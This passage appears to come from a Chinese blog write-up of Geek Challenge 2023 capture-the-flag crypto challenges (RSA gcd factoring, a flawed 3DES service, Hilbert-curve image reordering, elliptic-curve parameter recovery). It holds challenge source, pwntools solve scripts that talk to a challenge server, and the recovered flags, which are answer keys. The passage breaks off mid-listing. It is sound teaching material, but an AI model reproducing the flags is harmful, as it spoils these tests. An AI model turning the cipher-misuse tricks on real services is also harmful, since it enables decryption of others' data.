<span class="number">353128571201645377052005694809874806643786163076931670184196149901625274899734977100920488129375537186771931435883114557320913415191396857882995726660784707377672210953334914418470453787964899846194872721616628198368241044602144880543115393715025896206210152190007408112767478800650578941849344868081146624444817544806046188600685873402369145450593575618922226415069043442295774369567389939040265656574664538667552522329712111984168798829635080641332045614585247317991581514218486004191829362787750803153463482021229058714990823658655863245025037102127138472397462755776598314247771125981017814912049441827643898478473451005083533693951329544115861795587564408860828213753948427321483082041546722974666875065831843384005041800692983406353922680299538080900818930589336142421748023025830846906503542594380663429947801329079870530727382679634952272644949425079242992486832995962516376820051495641486546631849426876810933393153871774796182078367277299340503872124124714036499367887886486264658590613431293656417255355575602576047502506125375605713228912611320198066713358654181533335650785578352716562937038768171269136647529849805172492594142026261051266577821582011917001752590659862613307646536049830151262848916867223615064832279222</span></span><br><span class="line">c= <span class="number">375617816311787295279632219241669262704366237192565344884527300748210925539528834207344757670998995567820735715933908541800125317082581328287816628816752542104514363629022246620070560324071543077301256917337165566677142545053272381990573611757629429857842709092285442319141751484248315990593292618113678910350875156232952525787082482638460259354559904243062546518553607882194808191571131590524874275187750985821420412987586148770397073003186510357920710387377990379862185266175190503647626248057084923516190642292152259727446111686043531725993433395002330208067534104745851308178560234372373476331387737629284961288204368572750848248186692623500372605736825205759172773503283282321274793846281079650686871355211691681512637459986684769598186821524093789286661348936784712071312135814683041839882338235290487868969391040389837253093468883093296547473466050960563347060307256735803099039921213839491129726807647623542881247210251994139130146519265086673883077644185971830004165931626986486648581644383717994174627681147696341976767364316172091139507445131410662391699728189797082878876950386933926807186382619331901457205957462337191923354433435013338037399565519987793880572723211669459895193009710035003369626116024630678400746946356</span></span><br><span class="line">n= <span class="number">728002565949733279371529990942440022467681592757835980552797682116929657292509059813629423038094227544032071413317330087468458736175902373398210691802243764786251764982802000867437756347830992118278032311046807282193498960587170291978547754942295932606784354258945168927044376692224049202979158068158842475322825884209352566494900083765571037783472505580851500043517614314755340168507097558967372661966013776090657685241689631615245294004694287660685274079979318342939473469143729494106686592347327776078649315612768988028622890242005700892937828732613800620455225438339852445425046832904615827786856105112781009995862999853122308496903885748394541643702103368974605177097553007573113536089894913967154637055293769061726082740854619536748297829779639633209710676774371525146758917646731487495135734759201537358734170552231657257498090553682791418003138924472103077035355223367678622115314235119493397080290540006942708439607767313672671274857069053688258983103863067394473084183472609906612056828326916114024662795812611685559034285371151973580240723680736227737324052391721149957542711415812665358477474058103338801398214688403784213100455466705770532894531602252798634923125974783427678469124261634518543957766622712661056594132089</span></span><br><span class="line"></span><br><span class="line">x1 = <span class="built_in">pow</span>(c1 * <span class="built_in">pow</span>(<span class="number">3</span>, -e1, n),e2,n)</span><br><span class="line">x2 = <span class="built_in">pow</span>(c2 * <span class="built_in">pow</span>(<span class="number">7</span>, -e2, n),e1,n)</span><br><span class="line">p = gcd(x1-x2, n)</span><br><span class="line">q = n//p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m= <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;poly_rsa_Just_need5_s1mple_gcd&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Simple3DES"><a href="#Simple3DES" class="headerlink" title="Simple3DES"></a>Simple3DES</h3><blockquote><p>题目链接：nc 59.110.20.54:23333 <a href="https://blog.csdn.net/Mr_wzc/article/details/121713518">https://blog.csdn.net/Mr_wzc/article/details/121713518</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">xor = <span class="keyword">lambda</span> a,b: <span class="built_in">bytes</span>([a[i % <span class="built_in">len</span>(a)] ^ b[i % <span class="built_in">len</span>(b)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">max</span>(<span class="built_in">len</span>(a), <span class="built_in">len</span>(b)))])</span><br><span class="line">pad = <span class="keyword">lambda</span> msg,padlen: msg+<span class="built_in">chr</span>((padlen-(<span class="built_in">len</span>(msg)%padlen))).encode()*(padlen-(<span class="built_in">len</span>(msg)%padlen))</span><br><span class="line"></span><br><span class="line">flag = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span>).encode()</span><br><span class="line">sec = os.urandom(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">banner = <span class="string">&#x27;|&#x27;</span>*<span class="number">70</span></span><br><span class="line"></span><br><span class="line">DEBUG = <span class="literal">False</span> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof_of_work</span>():</span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">    digest = hashlib.sha256(proof.encode()).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sha256(XXXX+%s) == %s&quot;</span> % (proof[<span class="number">4</span>:], digest))</span><br><span class="line">    x = <span class="built_in">input</span>(<span class="string">&quot;Give me XXXX: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(x)!=<span class="number">4</span> <span class="keyword">or</span> hashlib.sha256((x+proof[<span class="number">4</span>:]).encode()).hexdigest() != digest:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Right!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">msg,key</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key = long_to_bytes(key)</span><br><span class="line">        msg = xor(long_to_bytes(msg),sec)</span><br><span class="line">        des = DES3.new(key,DES3.MODE_ECB)</span><br><span class="line">        ct = xor(des.encrypt(pad(msg,<span class="number">8</span>)),sec)</span><br><span class="line">        <span class="keyword">return</span> bytes_to_long(ct)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">return</span> Exception</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">service</span>():</span><br><span class="line">    cnt = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proof_of_work():</span><br><span class="line">        exit()</span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Simple DES Encryption Service&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    <span class="keyword">while</span> cnt&lt;<span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;1. Encrypt\n2. Get encrypted flag.&#x27;</span>)</span><br><span class="line">        choice = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>))</span><br><span class="line">        <span class="keyword">if</span> choice == <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Input msg:&#x27;</span>)</span><br><span class="line">            msg = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>).strip())</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Input key:&#x27;</span>)</span><br><span class="line">            key = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>).strip())</span><br><span class="line">            <span class="built_in">print</span>(enc(msg,key))</span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Input key:&#x27;</span>)</span><br><span class="line">            key = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>).strip())</span><br><span class="line">            <span class="built_in">print</span>(enc(bytes_to_long(flag),key))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            exit()</span><br><span class="line">        cnt+=<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(banner)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Bye!&#x27;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    service()</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Something goes wrong...\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure></blockquote><p>代码问题在先xor后pad，对于 <code>m=b&#39;\x00&#39;</code>，有 <code>m^sec=sec</code>，<code>pad(sec,8)=sec+b&#39;\x08&#39;*8</code>。</p><p>第一轮：</p><p><code>pad(sec,8)=sec+b&#39;\x08&#39;*8</code>，加密得到 <code>c1^x | c2^x</code>，又由 <code>b&#39;\x08&#39;*8</code> 可求出 <code>c2</code>，得到 <code>x</code>。</p><p>第二轮：</p><p>已知 <code>c&#39;^x</code>，解密得到 <code>flag^x</code>，再异或得到 <code>flag</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;59.110.20.54&quot;</span>,<span class="number">23333</span>)</span><br><span class="line"></span><br><span class="line">table = string.ascii_letters+string.digits</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PoW</span>():</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;XXXX+&quot;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">16</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&quot;== &quot;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: sha256((x + suffix).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">4</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;XXXX: &#x27;</span>, proof.encode())</span><br><span class="line">    </span><br><span class="line">PoW()</span><br><span class="line"></span><br><span class="line">xor = <span class="keyword">lambda</span> a,b: <span class="built_in">bytes</span>([a[i % <span class="built_in">len</span>(a)] ^ b[i % <span class="built_in">len</span>(b)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">max</span>(<span class="built_in">len</span>(a), <span class="built_in">len</span>(b)))])</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">key = bytes_to_long(<span class="string">b&#x27;abcdefgh&#x27;</span>+<span class="string">b&#x27;ijklmnop&#x27;</span>+<span class="string">b&#x27;qrstuvwx&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;flag.\n&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;msg:\n&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(m).encode())</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;key:\n&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(key).encode())</span><br><span class="line"></span><br><span class="line">c_xor = long_to_bytes(<span class="built_in">eval</span>(r.recvline()))</span><br><span class="line">c1_xor,c2_xor = c_xor[:<span class="number">8</span>],c_xor[<span class="number">8</span>:]</span><br><span class="line"></span><br><span class="line">des = DES3.new(long_to_bytes(key),DES3.MODE_ECB)</span><br><span class="line"></span><br><span class="line">c2 = des.encrypt(<span class="string">b&#x27;\x08&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">sec = xor(c2,c2_xor)</span><br><span class="line"><span class="built_in">print</span>(sec)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;flag.\n&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;key:\n&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(key).encode())</span><br><span class="line"></span><br><span class="line">flag_c_xor = long_to_bytes(<span class="built_in">eval</span>(r.recvline()))</span><br><span class="line">flag_c = xor(flag_c_xor,sec)</span><br><span class="line">flag_xor = des.decrypt(flag_c)</span><br><span class="line">flag = xor(flag_xor,sec)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;DES_1s_0ut_0f_t1me&#125;o&#x27; </span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="JPGDiff"><a href="#JPGDiff" class="headerlink" title="JPGDiff"></a>JPGDiff</h3><blockquote><p>图片中的字符串即为flag</p></blockquote><p>提示图片为Hilbert曲线，且长图为1*65536的jpg图片，符合8阶Hilbert曲线的节点数。</p><p>按8阶Hilbert曲线的顺序来布置每一个1*1像素，即可还原原始图片。</p><p>利用<a href="https://github.com/galtay/hilbertcurve">hilbertcurve</a>包完成构造：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hilbertcurve.hilbertcurve <span class="keyword">import</span> HilbertCurve</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image </span><br><span class="line">im_cp = Image.<span class="built_in">open</span>(<span class="string">&quot;ct.png&quot;</span>)</span><br><span class="line">im_new = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">256</span>,<span class="number">256</span>)) </span><br><span class="line"></span><br><span class="line">p=<span class="number">8</span>; n=<span class="number">2</span></span><br><span class="line">hilbert_curve = HilbertCurve(p, n)</span><br><span class="line">distances = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">65536</span>))</span><br><span class="line">points = hilbert_curve.points_from_distances(distances)</span><br><span class="line">order = []</span><br><span class="line"><span class="keyword">for</span> point, dist <span class="keyword">in</span> <span class="built_in">zip</span>(points, distances):</span><br><span class="line">    <span class="comment">#print(f&#x27;&#123;dist&#125; = &#123;tuple(point)&#125;&#x27;)</span></span><br><span class="line">    order.append(<span class="built_in">tuple</span>(point))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(order))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">    tmp = im_cp.getpixel((<span class="number">0</span>,k))</span><br><span class="line">    im_new.putpixel(order[k],tmp)</span><br><span class="line">    </span><br><span class="line">im_new.save(<span class="string">&#x27;m.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到图片：</p><p><img src="/2023/11/27/match-Geek-Challenge-2023/m-1701104909234-1.png" alt="m"></p><p>flag：<code>SYC&#123;H1LB5RT_C1pher&#125;</code></p><p>​    </p><h3 id="Energetic-Carcano"><a href="#Energetic-Carcano" class="headerlink" title="Energetic_Carcano"></a>Energetic_Carcano</h3><blockquote><p>题目链接：nc 59.110.20.54:8763 <a href="https://en.wikipedia.org/wiki/Elliptic-curve_cryptography">https://en.wikipedia.org/wiki/Elliptic-curve_cryptography</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from sage.all import *</span></span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">import</span> random </span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"><span class="keyword">import</span> hashlib </span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">DEBUG = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">banner = <span class="string">&#x27;|&#x27;</span>*<span class="number">70</span> </span><br><span class="line">flag = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">b&quot;SYC&#123;Al3XEI_FAKE_FLAG&#125;&quot;</span>).encode()</span><br><span class="line">pbits = <span class="number">120</span></span><br><span class="line">abp = <span class="string">&quot;abp&quot;</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">proof_of_work</span>(): </span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)])</span><br><span class="line">    digest = hashlib.sha256(proof.encode()).hexdigest()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;sha256(XXXX+%s) == %s&quot;</span> % (proof[<span class="number">4</span>:], digest))</span><br><span class="line">    x = <span class="built_in">input</span>(<span class="string">&quot;Give me XXXX: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(x)!=<span class="number">4</span> <span class="keyword">or</span> hashlib.sha256((x+proof[<span class="number">4</span>:]).encode()).hexdigest() != digest: </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Right!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">a,b,p,turn,ans</span>):</span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> turn == <span class="string">&quot;a&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(a) == ans </span><br><span class="line">        <span class="keyword">if</span> turn == <span class="string">&quot;b&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(b) == ans</span><br><span class="line">        <span class="keyword">if</span> turn == <span class="string">&quot;p&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(p) == ans  </span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>: </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> proof_of_work():</span><br><span class="line">        exit() </span><br><span class="line">    <span class="built_in">print</span>(banner) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;\nHi Crypto-ers! AL3XEI here. I know you are excellent at math, so I prepared a game for u.&#x27;</span>) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;In the equation y^2 = x^3+ a*x + b (mod p), 4 points are given. Plz give me the right a, b or p to contine the game.&#x27;</span>) </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Good Luck!\n&#x27;</span>) </span><br><span class="line">    <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        turn = random.choice(abp) </span><br><span class="line">        p = getPrime(pbits) </span><br><span class="line">        a,b = [next_prime(random.randint(<span class="number">2</span>,p)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="string">&quot;ab&quot;</span>] </span><br><span class="line">        curve = EllipticCurve(GF(p),[a,b]) </span><br><span class="line">        pts = [curve.random_point() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        pts = [(_[<span class="number">0</span>], _[<span class="number">1</span>]) <span class="keyword">for</span> _ <span class="keyword">in</span> pts] </span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> pts:</span><br><span class="line">            <span class="built_in">print</span>(_,end=<span class="string">&quot; &quot;</span>) </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\nGive me &#x27;</span>+turn+<span class="string">&quot; :&quot;</span>) </span><br><span class="line">        ans = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>)) </span><br><span class="line">        <span class="keyword">if</span> check(a,b,p,turn,ans):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Good! Next challenge-&gt;\n&quot;</span>) </span><br><span class="line">            <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            pbits+=<span class="number">5</span>  </span><br><span class="line">            <span class="keyword">continue</span> </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Something goes wrong...\n&quot;</span>) </span><br><span class="line">            <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">            exit() </span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Congrats! Your flag is:&#x27;</span>,flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Something goes wrong...\n&quot;</span>) </span><br><span class="line">    <span class="built_in">print</span>(banner+<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">    exit() </span><br></pre></td></tr></table></figure></blockquote><p>类似LCG计算 $a,b,p$ 的方法，利用结式计算 $a,b,p$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 